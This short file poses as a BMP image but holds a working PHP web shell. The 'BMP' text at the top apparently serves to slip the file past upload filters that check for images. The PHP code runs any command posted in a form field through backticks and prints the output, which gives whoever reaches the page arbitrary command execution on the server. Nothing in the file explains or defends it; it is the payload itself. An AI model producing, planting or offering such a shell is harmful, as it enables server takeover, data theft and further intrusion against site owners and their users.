BMP
<br>
<?php
  $cmd = $_POST['cmd'];
  $output = `$cmd 2>&1`;
?>
<form method="post">
  <input type="text" name="cmd" autofocus value="<?php echo $cmd ?>" /><br>
  <input type="submit" /><br>
  <?php echo "<pre>$output</pre>"; ?>
</form>